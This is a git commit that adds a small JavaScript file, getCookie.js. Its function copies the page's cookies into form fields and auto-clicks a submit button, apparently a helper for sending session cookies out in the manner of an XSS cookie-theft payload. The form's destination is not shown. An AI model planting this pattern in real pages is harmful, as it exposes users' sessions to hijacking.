abd53747dfcd7e2dfd425949536d222754b0c441
4xx404 <45526353+4xx404@users.noreply.github.com>
2021-08-11 19:35:56 +0100

    Create getCookie.js

---
+++ js/getCookie.js
@@ -0,0 +1,7 @@
+function getCookie(){
+        var decodedCookie = decodeURIComponent(document.cookie);
+	var dc = decodedCookie;
+	document.getElementById('cookieval').value = document.cookie;
+	document.getElementById('decodedcookie').value = dc;
+	document.getElementById('submitForm').click();			
+}
